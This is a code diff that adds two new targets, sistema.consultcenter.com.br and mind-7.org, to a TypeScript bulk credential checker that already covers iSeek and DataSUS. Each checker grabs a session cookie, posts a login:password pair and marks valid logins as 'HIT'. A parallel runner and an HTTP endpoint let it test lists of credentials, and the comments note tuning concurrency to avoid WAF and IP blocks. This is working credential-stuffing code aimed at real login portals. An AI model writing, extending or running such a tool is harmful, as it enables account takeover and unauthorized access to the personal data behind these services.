@@ -66,7 +66,7 @@ function runCurl(argv: string[], timeoutMs = 15_000): Promise<CurlResult> {
 
 // ── Types ─────────────────────────────────────────────────────────────────────
 export type CheckStatus = "HIT" | "FAIL" | "ERROR";
-export type CheckerTarget = "iseek" | "datasus";
+export type CheckerTarget = "iseek" | "datasus" | "consultcenter" | "mind7";
 
 export interface CheckResult {
   credential: string;
@@ -358,13 +358,175 @@ async function pMap<T, R>(
   return results;
 }
 
+// ═══════════════════════════════════════════════════════════════════════════════
+//  CONSULT CENTER CHECKER — https://sistema.consultcenter.com.br/users/login
+//  Logic: GET page → grab CAKEPHP session cookie → POST creds → detect error/success
+// ═══════════════════════════════════════════════════════════════════════════════
+const CC_URL     = "https://sistema.consultcenter.com.br/users/login";
+const CC_TIMEOUT = 20_000;
+
+async function checkConsultCenter(login: string, password: string): Promise<CheckResult> {
+  const credential = `${login}:${password}`;
+  const cookieFile = `/tmp/cc_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;
+
+  try {
+    // ── Step 1: GET login page — obtain session cookie ─────────────────────
+    let getResult: CurlResult;
+    try {
+      getResult = await runCurl([
+        "-c", cookieFile,
+        "-H", `User-Agent: ${DESKTOP_UA}`,
+        "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "-H", "Accept-Language: pt-BR,pt;q=0.9,en;q=0.8",
+        CC_URL,
+      ], CC_TIMEOUT);
+    } catch (e) {
+      return { credential, login, status: "ERROR", detail: `GET_ERROR:${String(e)}` };
+    }
+
+    if (getResult.statusCode === 0 || getResult.statusCode >= 500) {
+      return { credential, login, status: "ERROR", detail: `GET_HTTP_${getResult.statusCode}` };
+    }
+
+    // ── Step 2: POST credentials — check for error flash or redirect ────────
+    const postBody = [
+      `_method=POST`,
+      `data%5BUsuarioLogin%5D%5Busername%5D=${encodeURIComponent(login)}`,
+      `data%5BUsuarioLogin%5D%5Bpassword%5D=${encodeURIComponent(password)}`,
+    ].join("&");
+
+    let postResult: CurlResult;
+    try {
+      postResult = await runCurl([
+        "-b", cookieFile,
+        "-H", `User-Agent: ${DESKTOP_UA}`,
+        "-H", "Content-Type: application/x-www-form-urlencoded",
+        "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "-H", "Accept-Language: pt-BR,pt;q=0.9,en;q=0.8",
+        "-H", `Referer: ${CC_URL}`,
+        "-H", "Origin: https://sistema.consultcenter.com.br",
+        "--data-raw", postBody,
+        "--max-redirs", "0",  // do NOT follow — inspect Location header manually
+        CC_URL,
+      ], CC_TIMEOUT);
+    } catch (e) {
+      return { credential, login, status: "ERROR", detail: `POST_ERROR:${String(e)}` };
+    }
+
+    const body     = postResult.body;
+    const location = postResult.location;
+
+    // Success path 1: redirect to a non-login page
+    if (postResult.statusCode >= 301 && postResult.statusCode <= 308 && location) {
+      if (!location.includes("/users/login")) {
+        const hitUrl = location.startsWith("/")
+          ? `https://sistema.consultcenter.com.br${location}`
+          : location;
+        return { credential, login, status: "HIT", detail: hitUrl };
+      }
+      return { credential, login, status: "FAIL", detail: "redirect_back_to_login" };
+    }
+
+    // Success path 2: 200 response without error flash (rare, but some CakePHP apps)
+    if (!body.includes("alert-danger") && !body.includes("incorretos") && !body.includes("Usuário e senha")) {
+      if (body.includes("Bem-vindo") || body.includes("logout") || body.includes("Sair")) {
+        return { credential, login, status: "HIT", detail: "https://sistema.consultcenter.com.br/dashboard" };
+      }
+    }
+
+    // Fail: explicit error flash
+    if (body.includes("alert-danger") || body.includes("incorretos") || body.includes("Usuário e senha")) {
+      return { credential, login, status: "FAIL", detail: "credentials_invalid" };
+    }
+
+    return { credential, login, status: "FAIL", detail: "unknown_response" };
+  } finally {
+    try { unlinkSync(cookieFile); } catch { /* ok */ }
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  MIND-7 CHECKER — https://mind-7.org/acesso/
+//  Note: site is behind Cloudflare managed JS challenge (not bypassed via curl).
+//  All attempts will return ERROR:CLOUDFLARE_CHALLENGE.
+// ═══════════════════════════════════════════════════════════════════════════════
+const MIND7_URL     = "https://mind-7.org/acesso/";
+const MIND7_TIMEOUT = 15_000;
+
+async function checkMind7(login: string, password: string): Promise<CheckResult> {
+  const credential = `${login}:${password}`;
+  const cookieFile = `/tmp/m7_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;
+
+  try {
+    let getResult: CurlResult;
+    try {
+      getResult = await runCurl([
+        "-c", cookieFile,
+        "-H", `User-Agent: ${DESKTOP_UA}`,
+        "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "-H", "Accept-Language: pt-BR,pt;q=0.9,en;q=0.8",
+        "-H", "Sec-CH-UA: \"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\"",
+        "-H", "Sec-CH-UA-Mobile: ?0",
+        "-H", "Sec-CH-UA-Platform: \"Windows\"",
+        "-H", "Sec-Fetch-Dest: document",
+        "-H", "Sec-Fetch-Mode: navigate",
+        "-H", "Sec-Fetch-Site: none",
+        MIND7_URL,
+      ], MIND7_TIMEOUT);
+    } catch (e) {
+      return { credential, login, status: "ERROR", detail: `GET_ERROR:${String(e)}` };
+    }
+
+    // Detect Cloudflare challenge
+    const isCFChallenge =
+      getResult.statusCode === 403 ||
+      getResult.statusCode === 503 ||
+      getResult.body.includes("_cf_chl_opt") ||
+      getResult.body.includes("cf-mitigated") ||
+      getResult.body.includes("Just a moment") ||
+      getResult.body.includes("Enable JavaScript and cookies");
+
+    if (isCFChallenge) {
+      return { credential, login, status: "ERROR", detail: "CLOUDFLARE_CHALLENGE" };
+    }
+
+    // If we somehow got past CF, try to POST
+    const postBody = `username=${encodeURIComponent(login)}&password=${encodeURIComponent(password)}`;
+    let postResult: CurlResult;
+    try {
+      postResult = await runCurl([
+        "-b", cookieFile,
+        "-H", `User-Agent: ${DESKTOP_UA}`,
+        "-H", "Content-Type: application/x-www-form-urlencoded",
+        "-H", `Referer: ${MIND7_URL}`,
+        "-H", "Origin: https://mind-7.org",
+        "--data-raw", postBody,
+        "--max-redirs", "5",
+        MIND7_URL,
+      ], MIND7_TIMEOUT);
+    } catch (e) {
+      return { credential, login, status: "ERROR", detail: `POST_ERROR:${String(e)}` };
+    }
+
+    const loc = postResult.location;
+    if (loc && !loc.includes("/acesso") && !loc.includes("/login")) {
+      return { credential, login, status: "HIT", detail: loc };
+    }
+    return { credential, login, status: "FAIL", detail: "credentials_invalid" };
+  } finally {
+    try { unlinkSync(cookieFile); } catch { /* ok */ }
+  }
+}
+
 // ── Runner ────────────────────────────────────────────────────────────────────
-// Concurrency: DataSUS = 3 parallel sessions (conservative — server blocks >3 simultaneous IPs)
-//              iSeek   = 2 parallel (CSRF per session, lower concurrency avoids WAF blocks)
-const CONCURRENCY: Record<CheckerTarget, number> = { datasus: 2, iseek: 2 };
+const CONCURRENCY: Record<CheckerTarget, number> = { datasus: 2, iseek: 2, consultcenter: 3, mind7: 3 };
 
 async function runBulk(pairs: Array<{ login: string; password: string }>, target: CheckerTarget): Promise<CheckerBulkResponse> {
-  const checker     = target === "datasus" ? checkDataSUS : checkIseek;
+  const checker =
+    target === "datasus"      ? checkDataSUS      :
+    target === "consultcenter"? checkConsultCenter :
+    target === "mind7"        ? checkMind7        :
+    checkIseek;
   const concurrency = CONCURRENCY[target];
 
   const results = await pMap(pairs, ({ login, password }) => checker(login, password), concurrency);
@@ -390,8 +552,9 @@ router.post("/checker/check", async (req, res): Promise<void> => {
     target?:      CheckerTarget;
   };
 
-  if (target !== "iseek" && target !== "datasus") {
-    res.status(400).json({ error: "target must be 'iseek' or 'datasus'" });
+  const validTargets: CheckerTarget[] = ["iseek", "datasus", "consultcenter", "mind7"];
+  if (!validTargets.includes(target as CheckerTarget)) {
+    res.status(400).json({ error: "target must be 'iseek', 'datasus', 'consultcenter', or 'mind7'" });
     return;
   }
 
